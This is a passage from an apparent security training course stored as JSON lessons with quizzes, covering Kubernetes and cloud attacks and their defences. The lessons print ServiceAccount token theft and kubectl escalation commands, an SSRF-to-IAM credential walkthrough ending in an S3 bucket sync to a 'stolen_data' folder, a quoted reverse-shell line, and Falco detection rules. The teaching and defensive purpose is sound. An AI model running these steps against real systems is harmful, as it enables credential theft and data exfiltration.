<td><code>--insecure-port=8080</code></td>\n      <td>Explicitly set <code>--insecure-port=0</code> to eliminate cleartext ports</td>\n    </tr>\n    <tr>\n      <td><strong>API Server</strong></td>\n      <td><code>--anonymous-auth=true</code></td>\n      <td>Declare <code>--anonymous-auth=false</code> to deny unauthenticated requests</td>\n    </tr>\n    <tr>\n      <td><strong>Kubelet</strong></td>\n      <td>Anonymous access enabled</td>\n      <td><code>authentication.anonymous.enabled: false</code></td>\n    </tr>\n    <tr>\n      <td><strong>Kubelet</strong></td>\n      <td>Authorization mode: AlwaysAllow</td>\n      <td><code>authorization.mode: Webhook</code> (delegates RBAC checks to API Server)</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>5. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>The API Server represents the ultimate administrative authority; never expose port 8080 or unauthenticated 6443 interfaces.</li>\n    <li><strong>Kubelet port 10250 possesses native command execution endpoints</strong>, necessitating Webhook authorization and disabled anonymous access.</li>\n    <li>Automate compliance audits using the <strong>CIS Kubernetes Benchmark</strong> to eradicate exposed management ports.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Kubelet Authentication Probing</div>\n  <p>Audit an active worker node interface:</p>\n  <pre><code class=\"language-bash\">curl -k -s -o /dev/null -w \"%{http_code}\" https://&lt;node-ip&gt;:10250/pods</code></pre>\n  <p>If the response returns <code>200 OK</code> versus <code>401 Unauthorized</code>, what does this reveal regarding node authentication controls?</p>\n</div>\n","checkpoints":[{"question":"What severe security hazard occurs if a Kubernetes API Server enables the '--insecure-port=8080' flag?","options":["It only allows inspecting cluster time sync status","It bypasses all TLS authentication and RBAC checks, granting unauthenticated clients full cluster-admin access to extract secrets and deploy arbitrary pods","It restricts clients to read-only pod log views","It forces the cluster to power down immediately"],"answer":1,"explanation":"The legacy insecure port 8080 bypasses all authentication and authorization checks. Exposing it allows anyone with network connectivity to assume cluster-admin control; it must be disabled via --insecure-port=0."},{"question":"If a worker node's Kubelet port 10250 permits anonymous access without Webhook authorization, what action can an attacker take directly?","options":["Modifying the physical network card MAC address","Issuing POST requests to /run/<ns>/<pod>/<container> to execute arbitrary commands inside workloads, bypassing the central API Server","Reinstalling the host operating system to Windows","Wiping motherboard BIOS passwords"],"answer":1,"explanation":"Port 10250 provides direct Kubelet execution APIs. Without authentication, attackers can post commands directly to running pods on that node without passing through API server audit logs."}]},
  "cloud-04-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Privilege Escalation</div>\n  <h1>RBAC Role Models &amp; ServiceAccount Token Abuse</h1>\n  <p class=\"lead\">Kubernetes Role-Based Access Control (RBAC) represents the cluster's most sophisticated and misconfigured security defense. Once a pod is compromised, the attacker's immediate prize is the automatically mounted ServiceAccount Token. This lesson dissects RBAC authorization primitives and explores token privilege escalation vectors.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Deconstructing the 4 RBAC Primitives</strong>: <code>Role</code>, <code>ClusterRole</code>, <code>RoleBinding</code>, and <code>ClusterRoleBinding</code> boundaries.</li>\n    <li><strong>Auditing ServiceAccount In-Pod Tokens</strong>: Understanding the auto-mounted assets under <code>/var/run/secrets/kubernetes.io/serviceaccount/</code>.</li>\n    <li><strong>5 Dangerous RBAC Escalation Paths</strong>: Abusing <code>bind</code>, <code>impersonate</code>, <code>pods/exec</code>, and <code>secrets get</code> to promote ordinary pods to cluster-admin.</li>\n  </ul>\n</div>\n\n<h2>1. Kubernetes RBAC Authorization Primitives</h2>\n<p>RBAC dictates \"Who (Subject) can perform What Action (Verb) against What Asset (Resource) in Which Context (Namespace)\":</p>\n\n<table class=\"data-table\">\n  <thead>\n    <tr>\n      <th>RBAC Object</th>\n      <th>Scope &amp; Semantics</th>\n      <th>Example Configuration</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Role</strong></td>\n      <td>Namespace-scoped permissions</td>\n      <td>Allows <code>get, list, watch</code> against <code>pods</code> in namespace <code>staging</code></td>\n    </tr>\n    <tr>\n      <td><strong>ClusterRole</strong></td>\n      <td>Cluster-wide global permissions</td>\n      <td>Grants access to non-namespaced assets like <code>nodes</code> and <code>persistentvolumes</code></td>\n    </tr>\n    <tr>\n      <td><strong>RoleBinding</strong></td>\n      <td>Grants permissions to subjects within a specific namespace</td>\n      <td>Binds the <code>developer</code> role to user Alice in namespace <code>dev</code></td>\n    </tr>\n    <tr>\n      <td><strong>ClusterRoleBinding</strong></td>\n      <td>Grants permissions globally across all namespaces</td>\n      <td>Binds <code>cluster-admin</code> to the ops team: <strong>Unrestricted cluster control</strong></td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. The In-Pod Token: Instant API Authentication</h2>\n<p>By default, Kubernetes automatically mounts the pod's ServiceAccount JWT credentials:</p>\n\n<pre><code class=\"language-bash\">container$ ls -l /var/run/secrets/kubernetes.io/serviceaccount/\n-rw-r--r-- 1 root root 1070 Mar 15 10:00 ca.crt\n-rw-r--r-- 1 root root   12 Mar 15 10:00 namespace\n-rw-r--r-- 1 root root  854 Mar 15 10:00 token</code></pre>\n\n<p>Adversaries capture this JWT and issue authenticated queries directly to the internal API service:</p>\n\n<pre><code class=\"language-bash\">TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\ncurl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/pods</code></pre>\n\n<h2>3. Five High-Impact RBAC Escalation Paths</h2>\n\n<div class=\"terminal-window\">\n  <div class=\"terminal-bar\">\n    <div class=\"terminal-dot red\"></div>\n    <div class=\"terminal-dot yellow\"></div>\n    <div class=\"terminal-dot green\"></div>\n    <span>bash — ServiceAccount RBAC Privilege Escalation</span>\n  </div>\n  <div class=\"terminal-body\">\n    <pre><code># [Path 1: pods/exec Permission]\n# Inject shell into high-privilege pods within kube-system\n$ kubectl --token=$TOKEN exec -n kube-system coredns-xyz -it -- sh\n\n# [Path 2: secrets/get Permission]\n# Extract cluster-admin tokens or database master passwords directly\n$ kubectl --token=$TOKEN get secrets -n kube-system -o yaml\n\n# [Path 3: certificatesigningrequests (CSR) Approval]\n# Approve a forged client certificate claiming membership in system:masters!\n\n# [Path 4: Impersonate Permission]\n# Impersonate administrative users natively\n$ kubectl --token=$TOKEN --as=system:admin get pods -A\n\n# [Path 5: create pods Permission]\n# Deploy a privileged rootfs-mounted container to achieve total cluster takeover!</code></pre>\n  </div>\n</div>\n\n<h2>4. Enterprise Hardening: Disabling Auto-Mounting</h2>\n<p>Most application containers (frontend proxies, microservices) require zero interaction with the Kubernetes API Server. Disable automatic credential injection explicitly:</p>\n\n<pre><code class=\"language-yaml\">apiVersion: v1\nkind: Pod\nmetadata:\n  name: hardened-app\nspec:\n  # ✅ Hardened Baseline: Prohibit automatic token mounting\n  automountServiceAccountToken: false\n  containers:\n    - name: web\n      image: nginx:alpine</code></pre>\n\n<h2>5. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>The default in-pod <strong>ServiceAccount JWT serves as a prime pivot for cluster lateral movement</strong>.</li>\n    <li>Permissive RBAC bindings (e.g. <code>create pods</code>, <code>secrets get</code>, or <code>impersonate</code>) allow rapid escalation to cluster-admin.</li>\n    <li>Enforce the <strong>principle of least privilege</strong> by setting <code>automountServiceAccountToken: false</code> across standard workloads.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: RBAC Boundary Auditing</div>\n  <p>Evaluate your pod's effective permissions via the API server:</p>\n  <pre><code class=\"language-bash\">kubectl auth can-i --list --token=$TOKEN</code></pre>\n  <p>If the output lists wildcard rules (e.g. <code>*.*</code> or <code>verbs: [*]</code>), what severity incident does this represent?</p>\n</div>\n","checkpoints":[{"question":"From which default path can an adversary harvest internal Kubernetes ServiceAccount credentials after breaching a pod?","options":["/etc/kubernetes/admin.conf","/var/run/secrets/kubernetes.io/serviceaccount/token","/root/.kube/config","/usr/bin/kubectl"],"answer":1,"explanation":"Kubernetes automatically projects the pod's ServiceAccount JWT, namespace, and CA certificate into /var/run/secrets/kubernetes.io/serviceaccount/, allowing pod workloads to query the API Server."},{"question":"If a compromised pod's ServiceAccount possesses 'create' rights over 'pods/exec', what privilege escalation vector is unlocked?","options":["Restarting only the current container","Injecting interactive shells into privileged pods (e.g. within kube-system) to harvest higher-level administrative credentials and cluster keys","No practical effect without cluster-admin permissions","Temporarily severing node network interfaces"],"answer":1,"explanation":"The pods/exec permission allows attaching processes to arbitrary target containers. Attackers can execute commands inside privileged controllers or DNS pods, seizing cluster-admin tokens."}]},
  "cloud-04-03": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Microsegmentation</div>\n  <h1>Kubernetes NetworkPolicy &amp; CNI Microsegmentation</h1>\n  <p class=\"lead\">Kubernetes employs a \"flat network by default\" philosophy, where any pod can communicate unrestricted with any other pod across any node. Once a perimeter workload is penetrated, adversaries encounter zero internal network barriers. This lesson examines CNI plugin capabilities and authoring zero-trust NetworkPolicies.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>The Flat Network Vulnerability</strong>: Why default unrestricted Pod-to-Pod connectivity enables rapid internal lateral movement.</li>\n    <li><strong>Container Network Interface (CNI) Capabilities</strong>: Contrasting Flannel (connectivity only) with Calico and Cilium (eBPF filtering and Layer 3/4 policy enforcement).</li>\n    <li><strong>Authoring Zero-Trust NetworkPolicies</strong>: Implementing Default Deny, service-to-service whitelisting, and egress egress restrictions.</li>\n  </ul>\n</div>\n\n<h2>1. The Hazards of Default Flat Networking</h2>\n<p>Kubernetes requires all pods to reach each other without NAT. While this simplifies microservice communication, it eliminates internal network zoning:</p>\n\n<pre><code class=\"language-text\">[Compromised Edge Web Pod]\n       │\n       ├─▶ (Direct probe) ──▶ [Internal MySQL Database Pod (Port 3306)]\n       ├─▶ (Direct probe) ──▶ [Payment Processing Microservice (Port 8080)]\n       └─▶ (Direct probe) ──▶ [Cloud Metadata Endpoint (169.254.169.254)]\n[Conclusion: Zero internal firewalls by default!]</code></pre>\n\n<h2>2. Essential Prerequisite: Policy-Capable CNI Plugins</h2>\n<div class=\"callout callout-warning\">\n  <div class=\"callout-title\">⚠️ Operational Pitfall: Flannel Does Not Enforce NetworkPolicies!</div>\n  <p>Applying a <code>NetworkPolicy</code> manifest under a basic <strong>Flannel</strong> CNI succeeds without errors, but the kernel never enforces the rules. Policy enforcement requires an engine like <strong>Calico</strong> or <strong>Cilium</strong> (utilizing eBPF or iptables filtering).</p>\n</div>\n\n<h2>3. Zero-Trust Policy Construction Workflow</h2>\n\n<h3>3.1 Step 1: Default Deny All Traffic</h3>\n<p>Enforce an initial Default Deny policy across the target namespace to drop all unapproved ingress and egress packets:</p>\n\n<pre><code class=\"language-yaml\">apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: production\nspec:\n  podSelector: {} # Targets all pods in namespace\n  policyTypes:\n    - Ingress\n    - Egress</code></pre>\n\n<h3>3.2 Step 2: Explicit Service Whitelisting</h3>\n<p>Permit strictly verified backend pods matching <code>app: backend-api</code> to reach database endpoints:</p>\n\n<pre><code class=\"language-yaml\">apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-backend-to-db\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: mysql-db # Target protected workload\n  policyTypes:\n    - Ingress\n  ingress:\n    - from:\n        - podSelector:\n            matchLabels:\n              app: backend-api # Authorized callers only!\n      ports:\n        - protocol: TCP\n          port: 3306</code></pre>\n\n<h3>3.3 Step 3: Restricting Outbound Egress</h3>\n<p>Prevent compromised pods from establishing reverse shells or exfiltrating data to public C2 servers:</p>\n\n<pre><code class=\"language-yaml\">apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: restrict-egress-traffic\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: sensitive-service\n  policyTypes:\n    - Egress\n  egress:\n    # Allow CoreDNS lookups (UDP 53)\n    - to:\n        - namespaceSelector: {}\n          podSelector:\n            matchLabels:\n              k8s-app: kube-dns\n      ports:\n        - protocol: UDP\n          port: 53\n    # Deny access to link-local ranges: 169.254.0.0/16</code></pre>\n\n<h2>4. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>Default flat Kubernetes networks leave internal services vulnerable once the perimeter is breached.</li>\n    <li><strong>NetworkPolicies require a supporting CNI like Calico or Cilium</strong> to actively filter packet streams.</li>\n    <li>Implement microsegmentation using <strong>Default Deny baselines, label-based ingress whitelists, and egress filtering</strong>.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Policy Validation</div>\n  <p>Test microsegmentation enforcement:</p>\n  <ol>\n    <li>Within a namespace secured with <code>allow-backend-to-db</code>, test connectivity to <code>mysql-db:3306</code> from an unauthorized <code>frontend</code> pod vs the authorized <code>backend-api</code> pod using <code>nc -zv mysql-db 3306</code>.</li>\n    <li>Observe timeout versus immediate connection establishment behaviors.</li>\n  </ol>\n</div>\n","checkpoints":[{"question":"Why might applied Kubernetes NetworkPolicy manifests fail to filter or restrict pod-to-pod network communication?","options":["NetworkPolicies are only evaluated during weekend maintenance windows","The underlying CNI plugin (e.g. vanilla Flannel) provides routing only and lacks packet filtering or policy enforcement capabilities","Workload pods lack the curl binary","Every pod must be assigned a public IPv4 address for policies to work"],"answer":1,"explanation":"NetworkPolicies are declarations; actual enforcement requires a policy-capable CNI like Calico or Cilium. Running under plain Flannel leaves policies unenforced, retaining flat network access."},{"question":"What is the recommended initial baseline rule when implementing Zero-Trust microsegmentation via NetworkPolicy?","options":["Allow unrestricted communication across all pods initially","Deploy a Default Deny policy across the namespace to reject all ingress and egress packets that have not been explicitly whitelisted","Shut down physical node network cards","Prohibit external web traffic from reaching frontend services"],"answer":1,"explanation":"Zero trust mandates default denial. Applying a Default Deny policy blocks all unauthorized lateral paths first, after which legitimate service-to-service flows are added via explicit label selectors."}]},
  "cloud-05-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Cloud Pivoting</div>\n  <h1>IMDSv1 vs IMDSv2 &amp; Cloud Metadata SSRF / IAM Hijacking</h1>\n  <p class=\"lead\">Every virtual machine or container instance operating in major public clouds connects to a reserved link-local IP address: <code>169.254.169.254</code> (Instance Metadata Service, IMDS). If a web workload suffers from Server-Side Request Forgery (SSRF), attackers can harvest attached IAM temporary credentials to pivot into cloud data lakes and databases. This lesson deconstructs the Capital One breach mechanics and the engineering behind IMDSv2.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Deconstructing IMDS Architecture</strong>: Surveying link-local endpoints (<code>169.254.169.254</code>) across major cloud providers (AWS, GCP, Azure, Aliyun).</li>\n    <li><strong>The SSRF-to-IAM Exploitation Kill Chain</strong>: Extracting temporary <code>AccessKeyId</code>, <code>SecretAccessKey</code>, and session <code>Token</code> credentials from metadata paths.</li>\n    <li><strong>Architectural Evolution: IMDSv1 vs IMDSv2</strong>: How session tokens and <code>X-aws-ec2-metadata-token-ttl-seconds</code> headers eliminate simple SSRF vectors.</li>\n  </ul>\n</div>\n\n<h2>1. What Is the Instance Metadata Service (IMDS)?</h2>\n<p>Public clouds provide IMDS to enable workloads on virtual machines to query host attributes and assume IAM roles without hardcoding static API secrets. The service listens on the link-local IP <code>169.254.169.254</code>:</p>\n\n<table class=\"data-table\">\n  <thead>\n    <tr>\n      <th>Cloud Provider</th>\n      <th>Metadata Root URI</th>\n      <th>IAM Credential Discovery Endpoint</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>AWS</strong></td>\n      <td><code>http://169.254.169.254/latest/meta-data/</code></td>\n      <td><code>.../iam/security-credentials/&lt;role-name&gt;</code></td>\n    </tr>\n    <tr>\n      <td><strong>GCP</strong></td>\n      <td><code>http://metadata.google.internal/computeMetadata/v1/</code></td>\n      <td><code>.../instance/service-accounts/default/token</code></td>\n    </tr>\n    <tr>\n      <td><strong>Aliyun</strong></td>\n      <td><code>http://100.100.100.200/latest/meta-data/</code></td>\n      <td><code>.../Ram/security-credentials/&lt;role-name&gt;</code></td>\n    </tr>\n    <tr>\n      <td><strong>Azure</strong></td>\n      <td><code>http://169.254.169.254/metadata/instance</code></td>\n      <td><code>.../identity/oauth2/token?resource=https://management.azure.com/</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. Hands-on: SSRF IAM Credential Exfiltration</h2>\n\n<div class=\"terminal-window\">\n  <div class=\"terminal-bar\">\n    <div class=\"terminal-dot red\"></div>\n    <div class=\"terminal-dot yellow\"></div>\n    <div class=\"terminal-dot green\"></div>\n    <span>bash — Cloud Metadata SSRF Walkthrough</span>\n  </div>\n  <div class=\"terminal-body\">\n    <pre><code># [Step 1] Discover SSRF vulnerability; probe local instance IAM role\n$ curl \"https://vuln-app.com/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\nEC2-Production-S3-FullAccess-Role\n\n# [Step 2] Request full temporary credentials JSON for discovered role\n$ curl \"https://vuln-app.com/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-S3-FullAccess-Role\"\n{\n  \"Code\": \"Success\",\n  \"LastUpdated\": \"2026-03-15T10:00:00Z\",\n  \"Type\": \"AWS-HMAC\",\n  \"AccessKeyId\": \"ASIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\": \"IQoJb3JpZ2luX2VjE...\",\n  \"Expiration\": \"2026-03-15T16:00:00Z\"\n}\n\n# [Step 3] Configure harvested credentials on local attacker workstation\n$ export AWS_ACCESS_KEY_ID=\"ASIAIOSFODNN7EXAMPLE\"\n$ export AWS_SECRET_ACCESS_KEY=\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n$ export AWS_SESSION_TOKEN=\"IQoJb3JpZ2luX2VjE...\"\n\n# [Step 4] Enumerate and exfiltrate production customer storage buckets!\n$ aws s3 ls\n2026-03-10 12:00:00 production-customer-financial-records\n$ aws s3 sync s3://production-customer-financial-records ./stolen_data/</code></pre>\n  </div>\n</div>\n\n<h2>3. Defensive Revolution: IMDSv1 vs IMDSv2</h2>\n<p>Because IMDSv1 relied on straightforward unauthenticated HTTP GET queries, simple SSRF flaws led to complete cloud compromises. AWS engineered <strong>IMDSv2</strong>, requiring session-oriented PUT requests before metadata access:</p>\n\n<pre><code class=\"language-bash\"># IMDSv2 Step 1: Request signed Session Token via PUT method (TTL: 6 hours)\nTOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" \\\n  -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\n\n# IMDSv2 Step 2: Query metadata using mandatory header token\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n  http://169.254.169.254/latest/meta-data/</code></pre>\n\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">🛡️ Why IMDSv2 Neutralizes 99% of SSRF Exploits</div>\n  <p>Standard SSRF flaws in web applications typically restrict attackers to simple HTTP <code>GET</code> operations. They cannot forge custom HTTP verbs (<code>PUT</code>) nor inject custom headers like <code>X-aws-ec2-metadata-token-ttl-seconds</code>. Enforcing <code>HttpTokens: required</code> effectively closes the metadata exploitation vector.</p>\n</div>\n\n<h2>4. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>The link-local address <code>169.254.169.254</code> is an <strong>internal privileged cloud control interface</strong> exposing temporary IAM access tokens.</li>\n    <li>IMDSv1 lacks session authentication, acting as the primary catalyst in catastrophic enterprise cloud breaches.</li>\n    <li>Harden cloud infrastructure by <strong>requiring IMDSv2 (disabling IMDSv1)</strong> and enforcing Kubernetes NetworkPolicies blocking <code>169.254.0.0/16</code>.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Auditing Instance Metadata Options</div>\n  <p>Verify IMDS enforcement configuration using the AWS CLI:</p>\n  <pre><code class=\"language-bash\">aws ec2 describe-instances --instance-ids i-1234567890abcdef0 \\\n  --query 'Reservations[*].Instances[*].MetadataOptions'</code></pre>\n  <p>If <code>HttpTokens</code> evaluates to <code>\"optional\"</code>, what risk remains active? How is this transitioned to <code>\"required\"</code>?</p>\n</div>\n","checkpoints":[{"question":"What core function does the link-local address '169.254.169.254' provide across public clouds like AWS, GCP, and Aliyun?","options":["Public cloud recursive DNS resolvers","The Instance Metadata Service (IMDS), providing instance attributes and vending temporary IAM role security credentials","The default internet gateway for virtual machines","Local network Network Time Protocol (NTP) services"],"answer":1,"explanation":"The 169.254.169.254 interface vends dynamic instance metadata and IAM temporary session tokens to running workloads. In SSRF vulnerabilities, attackers query this endpoint to hijack cloud roles."},{"question":"How does IMDSv2 protect against simple Server-Side Request Forgery (SSRF) attacks compared to IMDSv1?","options":["By completely removing the 169.254.169.254 IP address","By mandating an initial HTTP PUT request to issue a signed, time-bounded session token that must be supplied as a custom header in all subsequent requests","By prompting for SMS two-factor authentication from node administrators","By restricting metadata queries strictly to standard business hours"],"answer":1,"explanation":"Most web SSRF vulnerabilities are restricted to simple HTTP GET requests. IMDSv2 requires an initial PUT request with custom TTL headers to acquire a session token, neutralizing standard SSRF exploits."}]},
  "cloud-05-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Runtime Telemetry</div>\n  <h1>Runtime Defense: Falco Rules &amp; eBPF Threat Telemetry</h1>\n  <p class=\"lead\">Containers are transient workloads measured in minutes or seconds. Traditional antivirus agents relying on scheduled scans or disk diffs fail completely against ephemeral cloud infrastructure. When an adversary establishes a reverse shell or tampers with binary paths, how do defenders detect it in real time? This lesson explores CNCF Falco and eBPF kernel-level event stream analysis.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>The Falco Architecture</strong>: Capturing kernel system calls via eBPF probes and streaming them to a user-space rules evaluation engine.</li>\n    <li><strong>Mastering Falco Rule Syntax</strong>: Structuring <code>rule</code>, <code>condition</code>, <code>output</code>, and <code>priority</code> declarations.</li>\n    <li><strong>Authoring 3 High-Impact Detection Rules</strong>: Flagging interactive shells, unauthorized access to <code>/etc/shadow</code>, and outbound reverse shell connections.</li>\n  </ul>\n</div>\n\n<h2>1. Why Host-Centric EDR Fails in Kubernetes</h2>\n<ul>\n  <li><strong>Workload Transience</strong>: Attackers compromise a pod, exfiltrate data, and terminate the workload within seconds, leaving minimal forensic artifacts.</li>\n  <li><strong>Context Blindness</strong>: Host-level EDR agents observe thousands of generic <code>node</code> or <code>python</code> binaries, lacking metadata to associate actions with specific Pods, Namespaces, or container tenants.</li>\n</ul>\n\n<h2>2. Falco: The eBPF Security Camera for Linux Kernels</h2>\n<p><strong>Falco</strong> hooks system call entry points within the Linux kernel via <strong>eBPF probes</strong>, streaming raw events into a high-throughput pattern matching engine with minimal CPU overhead:</p>\n\n<pre><code class=\"language-text\">[Container Process Invocation: bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444]\n       │\n       ▼ (Triggers kernel syscalls: execve, socket, connect)\n[Linux Kernel Ring 0 (eBPF Probe)]\n       │\n       ▼ (Low-overhead Perf Ring Buffer)\n[Falco Rule Engine (DaemonSet)] ──Rule matching──▶ [Emits Alert: Priority CRITICAL]\n       │\n       ▼\n[Response Pipeline (FalcoSidekick)] ──Kubernetes API──▶ [Terminates or isolates Pod in milliseconds!]</code></pre>\n\n<h2>3. Production Falco Rule Engineering</h2>\n<p>Falco rules use expressive YAML definitions featuring reusable macros and list structures:</p>\n\n<pre><code class=\"language-yaml\"># Rule 1: Detect interactive shell spawned inside a container workload\n- rule: Terminal Shell in Container\n  desc: A shell was spawned by or inside a container with an attached terminal\n  condition: &gt;\n    spawned_process and\n    container and\n    shell_procs and\n    proc.tty != 0 and\n    container_entrypoint\n  output: &gt;\n    Notice Shell spawned in container\n    (user=%user.name pod=%k8s.pod.name ns=%k8s.ns.name\n    cmd=%proc.cmdline parent=%proc.pname image=%container.image.repository)\n  priority: WARNING\n  tags: [container, shell, mitre_execution]\n\n# Rule 2: Capture outbound egress traffic to suspicious ports\n- rule: Outbound Connection from Sensitive Workload\n  desc: Detect sensitive backend pods attempting raw TCP egress to uncommon ports\n  condition: &gt;\n    outbound and\n    k8s.ns.name = \"production\" and\n    fd.port not in (80, 443, 53) and\n    not user_known_network_endpoints\n  output: &gt;\n    CRITICAL Outbound C2 connection detected!\n    (pod=%k8s.pod.name ip=%fd.rip port=%fd.rport command=%proc.cmdline)\n  priority: CRITICAL\n  tags: [network, c2, mitre_c2]</code></pre>\n\n<h2>4. Auditing Telemetry Logs</h2>\n<p>When triggered, Falco generates rich JSON telemetry enriched with Kubernetes pod metadata:</p>\n\n<div class=\"terminal-window\">\n  <div class=\"terminal-bar\">\n    <div class=\"terminal-dot red\"></div>\n    <div class=\"terminal-dot yellow\"></div>\n    <div class=\"terminal-dot green\"></div>\n    <span>Falco Real-Time Security Telemetry</span>\n  </div>\n  <div class=\"terminal-body\">\n    <pre><code>{\n  \"timestamp\": \"2026-03-15T10:15:30.123456Z\",\n  \"rule\": \"Terminal Shell in Container\",\n  \"priority\": \"Warning\",\n  \"output\": \"Notice Shell spawned in container (user=root pod=payment-api-789c ns=prod cmd=sh -c 'id' parent=node image=payment-api)\",\n  \"output_fields\": {\n    \"container.id\": \"3b2a1c0d\",\n    \"k8s.ns.name\": \"prod\",\n    \"k8s.pod.name\": \"payment-api-789c\",\n    \"proc.cmdline\": \"sh -c id\",\n    \"proc.pname\": \"node\",\n    \"user.name\": \"root\"\n  }\n}</code></pre>\n  </div>\n</div>\n\n<h2>5. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>Against ephemeral containers, <strong>real-time kernel syscall tracing via eBPF</strong> provides unmatched runtime visibility.</li>\n    <li>Falco rules integrate <strong>rule, condition, output, and priority fields</strong> with native Kubernetes context enrichment.</li>\n    <li>Coupling Falco telemetry with automated remediation (e.g. FalcoSidekick triggering Pod termination) closes the incident response loop in milliseconds.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Authoring a Detection Rule</div>\n  <p>Draft a custom Falco rule that triggers an <code>ERROR</code> alert whenever a non-root user attempts to read <code>/etc/shadow</code> from within a container, reporting pod name and namespace in the output.</p>\n</div>\n","checkpoints":[{"question":"Which Linux kernel technology allows Falco to capture container security events in real time with minimal CPU overhead?","options":["Nested hypervisor virtualization","Extended Berkeley Packet Filter (eBPF) system call telemetry","Scheduled filesystem diff snapshots","Promiscuous network packet mirroring"],"answer":1,"explanation":"Falco employs eBPF probes attached to kernel system call entry and exit tracepoints, streaming security-relevant events to user-space rule evaluators with sub-millisecond latency."},{"question":"Which event scenario represents a premier high-fidelity alert condition in enterprise Falco rules?","options":["Tracking how much RAM a container allocates","Detecting an interactive shell (/bin/sh or /bin/bash) spawned inside a production container with an attached TTY","Monitoring the number of incoming HTTP requests on port 80","Checking whether image tarballs exceed 1GB in size"],"answer":1,"explanation":"Production microservice containers are immutable and should never spawn interactive shells. Detecting a shell process with a TTY indicates remote command execution or interactive tampering."}]},
  "cloud-05-03": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Posture Management</div>\n  <h1>Cloud Security Posture Management &amp; Compliance Baselines</h1>\n  <p class=\"lead\">According to industry consensus, over 99% of cloud security failures stem from enterprise <strong>misconfigurations</strong> rather than flaws in cloud provider infrastructure. Leaked storage buckets, unrestricted security groups, and overprivileged IAM roles represent continuous operational risks. This lesson explores Cloud Security Posture Management (CSPM) frameworks and automated compliance auditing.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Core Tenets of CSPM</strong>: Continuous monitoring, configuration drift detection, and multi-cloud compliance governance.</li>\n    <li><strong>Top 4 Catastrophic Cloud Misconfigurations</strong>: Public storage buckets, unrestricted 0.0.0.0/0 management ports, overprivileged administrative roles, and disabled audit trails.</li>\n    <li><strong>Operationalizing Automated Audits</strong>: Using Prowler and ScoutSuite to benchmark infrastructure against CIS benchmarks.</li>\n  </ul>\n</div>\n\n<h2>1. The Role of Cloud Security Posture Management</h2>\n<p>Unlike physical datacenters governed by static hardware topology, <strong>cloud resources are software-defined assets driven by APIs</strong>. A misconfigured Terraform manifest or an erroneous console toggle can expose sensitive database backups to the entire internet in seconds.</p>\n<p><strong>CSPM</strong> delivers continuous compliance verification and configuration drift detection:</p>\n\n<pre><code class=\"language-text\">[Multi-Cloud Infrastructure (AWS, Azure, GCP, Aliyun)]\n       │\n       ▼ (Read-only API polling &amp; event-driven webhooks)\n[CSPM Engine (Prowler / Open-Source Auditing Suites)]\n       │\n       ▼ (Automated benchmarking against compliance regimes)\n  ├── 1. CIS Foundations Benchmarks (AWS/Kubernetes)\n  ├── 2. PCI-DSS, SOC 2, ISO 27001\n  └── 3. MITRE ATT&amp;CK for Cloud\n       │\n       